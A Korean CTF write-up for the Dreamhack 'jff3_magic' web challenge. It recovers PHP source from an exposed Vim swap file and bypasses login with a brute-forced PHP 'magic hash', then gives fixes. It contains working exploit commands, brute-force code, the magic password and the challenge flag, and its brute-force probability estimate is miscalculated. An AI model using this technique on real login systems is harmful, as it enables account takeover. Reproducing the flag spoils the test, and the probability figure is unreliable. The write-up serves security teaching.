---
layout: post
title:  "Dreamhack 워게임 [wargame.kr] jff3_magic 풀이 — Vim swap 디스클로저로 코드 회수, PHP magic hash 로 인증 우회"
date:   2026-05-20 14:30:00 +0900
categories: security web wargame dreamhack writeup php type-juggling magic-hash vim-swap
---

## 들어가며

Dreamhack 웹해킹 워게임 **[wargame.kr] jff3_magic** (난이도 별 2, 풀이자 362명) 풀이입니다. wargame.kr 의 "Just for Fun" 시즌3 출신 클래식 — 두 가지 흔한 함정의 연쇄:

1. **Vim swap 파일 (`.index.php.swp`) 디스클로저** 로 서버 PHP 소스 회수.
2. PHP 의 `==` 타입 저글링이 `0e<digits>` 모양의 해시를 **숫자 0** 으로 본다 — 그래서 두 사용자의 비밀번호 해시가 모두 그 형태이면 다른 비밀번호로도 로그인 통과 (**magic hash attack**).

문제 설명:

> This challenge is part of Just For Fun [Season3].
> - thx to Comma@LeaveRet

스포일러 결론:

```bash
SERVER="http://host8.dreamhack.games:PORT"

# 1) Vim swap 디스클로저로 소스 회수
curl "$SERVER/.index.php.swp" -o swp.bin   # 20KB 짜리 vim swap 파일

# 2) vim -r 로 복구하면 인증 로직이 보임
#    hash('haval128,5', pw) == userinfo[pw]   ← == 타입 저글링 함정

# 3) haval128,5(pw) 가 0e<digits> 모양이 되는 magic pw 를 brute force
#    (admin 의 저장된 해시도 0e<digits> 라는 게 출제 의도)
#    예: |pv7@g#7 → 0e063214987992998445268769847615

# 4) admin / magic pw 로 로그인 → 플래그
curl -X POST "$SERVER/?no=1" --data-urlencode "id=admin" --data-urlencode 'pw=|pv7@g#7'
# → Success! Hello admin / Flag : DH{173a922776c00f9150dd38a0d0243ff68150222b}
```

## 1. 자료 파악 — 다운로드된 zip 은 거의 비어 있음

zip 안에는 `no-need-to-download.txt` 한 파일이 전부. 그러니 black-box 로 시작.

서버를 켜고 `/` 에 들어가 보면 alert 한 줄이 친절하게 힌트를 던집니다:

```javascript
alert("under construction......\n....?\n(hint : swp)  :D"); // This is Hint!!
```

**`swp` = vim swap 파일** 의 약자. Vim 이 `file.php` 를 열면 같은 디렉토리에 `.file.php.swp` 가 만들어집니다. 종료 안 되거나 비정상 종료되면 그 파일이 남아 있고, 웹 서버가 그걸 정적으로 서빙하면 — **PHP 소스 풀 디스클로저**.

## 2. swap 파일 찾기

흔한 후보들을 죽 시험:

```bash
for f in ".index.php.swp" ".index.php.swo" "index.php~" \
         ".login.php.swp" ".admin.php.swp"; do
    curl -sS -o /dev/null -w "%{http_code} %{size_download}  $f\n" $SERVER/$f
done
# 200 20480  .index.php.swp   ← BINGO
# 404 286    others
```

`.index.php.swp` 20KB. 다운로드해서 `file` 로 확인:

```
$ file index.swp
index.swp: Vim swap file, version 7.4, pid 390, user root, host 93bb8547cfc9,
           file /var/www/html/index.php, modified
```

`/var/www/html/index.php` 의 swap 파일이 맞음. **루트 사용자가 vim 으로 열다가 그냥 떴거나 비정상 종료된 흔적** — 운영 환경에서 자주 일어나는 실수.

## 3. swap 파일 복구

vim 의 `-r` 옵션이 swap 파일을 읽어서 원본을 복구해 줍니다:

```bash
mkdir -p /tmp/r && cd /tmp/r
cp /downloaded.swp /tmp/r/.recovered.php.swp
echo "" > recovered.php
vim -r .recovered.php.swp -c "wq! recovered.php"
```

복구된 `recovered.php` 안에 인증 로직:

```php
<?php
if(isset($_POST['id'])) {
    sleep(2);  // DO NOT BRUTEFORCE
    $id = mysqli_real_escape_string($connect, $_POST['id']);
    $q = mysqli_query($connect, "SELECT * FROM `member` where id='{$id}'");
    $userinfo = @mysqli_fetch_array($q);
}
?>
...
<?php
if(isset($_POST['id'])) {
    if (hash('haval128,5', $_POST['pw'], false)
        == mysqli_real_escape_string($connect, $userinfo['pw'])) {
        echo 'Success! Hello '.$id."<br />";
        if ($id == "admin")
            echo 'Flag : '.$FLAG;
    } else {
        echo hash('haval128,5', $_POST['pw'], false);  // ← 친절히 해시도 노출
        echo 'Incorrect Password';
    }
}
?>
```

세 가지 핵심 포인트:

1. **`hash('haval128,5', pw) == $userinfo[pw]`** — `==` (느슨한 비교).
2. **`id` 는 escape** 됨 → SQLi 어렵지만, 해시 비교는 그대로.
3. **잘못된 비밀번호 시 입력 pw 의 해시 자체를 화면에 출력** — 결과 확인이 매우 쉬움.

## 4. PHP `==` 타입 저글링 — magic hash 의 원리

PHP 에서 `"a" == "b"` 는 의외로 복잡합니다 (PHP 7.x 기준):

1. 둘 중 하나라도 "숫자 문자열" (numeric string) 이면 → 양쪽 모두 number 로 캐스트해서 비교.
2. 그 외엔 문자열 비교.

"숫자 문자열" 의 정의에는 **부동소수 / 과학표기법** 도 포함:

```php
var_dump("0e123" == "0e456"); // true!
                              // 두 값 모두 numeric_string → 0 × 10^123 vs 0 × 10^456 → 0 == 0
var_dump("0e123" == "0");     // true
var_dump("0e123abc" == "0");  // false ("0e123abc" 는 non-numeric)
```

→ **해시 결과가 `0e<all digits>` 모양이면 그 값은 PHP 입장에서 "숫자 0"**. 그래서 서로 다른 해시 두 개가 둘 다 `0e<digits>` 모양이면 둘 다 `0` 으로 캐스트되어 `==` 가 참.

이걸 노린 게 **magic hash** 공격:

- admin 의 비밀번호 `?` → 저장된 해시: `0e<digits>` (출제자가 일부러 그렇게 선택).
- 공격자: 임의의 `pw` 를 brute force 해서 `hash('haval128,5', pw)` 도 `0e<digits>` 로 만든 다음 그걸 제출. PHP 가 `0 == 0` 으로 판정 → 로그인 성공.

## 5. magic pw brute force

haval128,5 는 128bit 해시 → hex 32자. `^0e\d{30}$` 가 될 확률은 대략 `(1/16)^2 × (10/16)^30 ≈ 1.5 × 10^{-10}`. 평균 67억 번 정도 시도해야 1개 발견. CPU 8코어 + 멀티프로세스로 2~3분이면 충분.

내가 쓴 PHP 한 줄짜리 brute (요지만):

```php
while (...) {
    $s = random_string(6..14);
    $h = hash('haval128,5', $s);
    if ($h[0]==='0' && $h[1]==='e' && ctype_digit(substr($h,2))) {
        echo "FOUND $s -> $h\n";
        break;
    }
}
```

8 worker 병렬로 200초 정도 돌리면 5~6개 hit. 내가 받은 결과 중 한 줄:

```
FOUND |pv7@g#7 -> 0e063214987992998445268769847615
```

→ pw 가 `|pv7@g#7` 일 때 해시가 `0e063214...` (e 이후 30자리 전부 digit). 완벽한 magic hash.

## 6. 익스플로잇

```bash
curl -X POST "$SERVER/?no=1" \
  --data-urlencode "id=admin" \
  --data-urlencode 'pw=|pv7@g#7'

# 응답:
#   Success! Hello admin
#   Flag : DH{173a922776c00f9150dd38a0d0243ff68150222b}
```

- `id=admin` 으로 admin row 가 로드됨.
- `pw=|pv7@g#7` 의 haval128,5 해시 = `0e063...` (PHP 가 0 으로 캐스트).
- admin 의 저장 해시 = `0e<other digits>` (역시 PHP 가 0 으로 캐스트).
- `0 == 0` → 로그인 통과 → admin 권한 → flag.

## 7. 안전하게 고치기

### 7.1 비밀번호 해시 비교는 `===` 또는 전용 함수

```php
// 나쁜 예: ==
if (hash('haval128,5', $pw) == $userinfo['pw']) { ... }

// 좋은 예 1: === (strict)
if (hash('haval128,5', $pw) === $userinfo['pw']) { ... }

// 더 좋은 예 2: timing-safe + hash 함수도 안전한 걸로
if (password_verify($pw, $userinfo['pw'])) { ... }   // bcrypt/argon2 기반
// password_hash() / password_verify() 가 PHP 표준의 정답
```

`hash_equals($a, $b)` 도 timing-safe 비교를 제공.

### 7.2 빠른 해시 함수를 비밀번호에 쓰지 말 것

`haval128,5` / `md5` / `sha1` / `sha256` 같은 **빠른 해시** 는 비밀번호용이 아닙니다. 같은 비밀번호 하나에 수많은 입력 후보를 던지는 brute force 가 매우 쉽기 때문. **`password_hash()` (기본 bcrypt) 나 argon2** 처럼 의도적으로 느린 함수를 써야 함.

### 7.3 vim swap / 백업 파일 disclosure

- 운영 서버의 웹 루트에서 vim 으로 직접 편집 금지. 로컬에서 편집 → rsync/scp/git 로 배포가 정공법.
- 만약 어쩔 수 없다면 web server 에 `.swp`, `.swo`, `~`, `.bak`, `.orig` 같은 확장자를 모두 403/404 처리하는 글로벌 룰을 둘 것:
  ```nginx
  location ~ \.(swp|swo|bak|orig|sql)$ { return 404; }
  location ~ ~$ { return 404; }
  ```
- `find . -name '*.swp' -delete` 를 CI 단계에 끼워두면 실수로 git 에 swap 이 들어가도 막을 수 있음.

### 7.4 잘못된 로그인 응답에 해시 노출 금지

이 문제는 친절하게 입력 pw 의 해시까지 응답에 출력했음. 이건 brute force 의 결과 확인을 비약적으로 빠르게 해 줍니다. 실서비스에선 **로그인 실패 응답은 단순 "fail" 만** — 어떤 식으로도 사용자의 입력값/내부 상태가 노출되면 안 됨.

## 8. 한 번 더 정리

### 8.1 취약점 카탈로그

| 단계 | 카테고리 | 원인 |
|---|---|---|
| `.index.php.swp` 정적 서빙 | Source Code Disclosure (CWE-540) | vim swap 파일이 웹 루트에 남음 |
| `==` 로 해시 비교 | Type Juggling / Authentication Bypass (CWE-697) | PHP loose comparison 의 magic hash |
| `0e<digits>` 모양 admin 해시 | Weak Hash Choice + Bad Comparison | 해시 함수가 약해서가 아니라 비교 방식이 약함 |
| 잘못된 pw 응답에 해시 echo | Information Exposure | brute force 정확도 향상에 기여 |

### 8.2 입문자가 챙겨가면 좋은 시각

- **모든 동적 언어의 `==` 는 의심**. PHP, JavaScript, Lua, Perl... `==` 가 type coercion 하는 곳은 거의 항상 인증 우회 가능성.
- **확장자가 노출되는 정적 파일 형태의 백업/임시 파일** (`*.swp`, `*.bak`, `*.orig`, `*.zip`, `*.git/`, `*.DS_Store`) 은 정기적으로 외부 스캔으로 확인. **개발자가 모르게 남기는 흔한 leak**.
- magic hash 의 대상이 되는 **해시 알고리즘 종류** 도 챙기자: MD4, MD5, SHA1, SHA224, SHA256, RIPEMD, HAVAL 등 거의 모든 빠른 해시에 magic 이 존재.

## 9. 시도했지만 실패한 것들 (회고)

### 9.1 처음 시도한 magic password 후보

처음엔 인터넷에 흔히 알려진 magic strings:

- `240610708` (MD5 magic)
- `aaroZmOk` (SHA1 magic)
- `EnWuv64Q` (이건 어디서 봤는지 기억 안 나는 후보)

→ 모두 **MD5/SHA1 magic** 이지 **haval128,5 의 magic 이 아님**. 응답에 친절히 출력해 준 해시들을 보면 0e 로 시작도 안 함:

```
EnWuv64Q → c5a07809f6788bc47669b372134d4d2e  (non-magic)
```

**회고**: magic hash 는 **알고리즘마다 다른 값** 이라는 기본 사실을 다시 한 번. "magic password" 라는 단어가 보편 명사처럼 들리지만 실제로는 알고리즘마다 brute force 가 필요. 풀이 30초 만에 자가 자가발견했지만 처음부터 brute force 로 갔으면 1분 빨랐을 듯.

### 9.2 brute force 1코어 → 너무 느림

처음엔 한 PHP 프로세스로만 brute force. 5400만 시도까지 가도 hit 0. 평균 67억 회가 필요하니 단일 프로세스로는 안 됨.

**회고**: `^0e\d{30}$` 같이 확률이 1e-10 수준인 패턴은 **꼭 멀티프로세스 / 멀티 머신** 으로. 8 worker 병렬로 약 200초 = 약 1.6G 회 시도 → 5 hit. 일반 가정용 노트북에서도 충분히 풀리는 양.

### 9.3 SQLi 경로 잠깐 고민

`select * from member where no=`$\_GET['no']`` 에 `no` 가 escape 안 된 게 보임. 거기서 UNION SELECT 로 admin 의 비밀번호 해시를 직접 leak 할 수도 있겠다 잠깐 생각. 하지만 `custom_firewall()` 의 내용을 모르고, **leak 한 해시도 결국 평문이 아닌 hash 이므로 그걸 알아도 같은 magic hash 우회로 결국 가야 함**. 즉 같은 일을 SQLi 경유로 한 번 더 거치는 셈이라 효율 손해. 다이렉트 magic hash 만 진행.

**회고**: 여러 길이 보일 때 **각 경로의 "그래서 최종적으로 뭘 알아야 하는가"** 를 끝까지 시뮬레이션해서 가장 짧은 경로 선택.

---

vim 으로 직접 운영 서버 편집 금지. 그리고 `==` 로 비밀번호 해시 비교 금지.
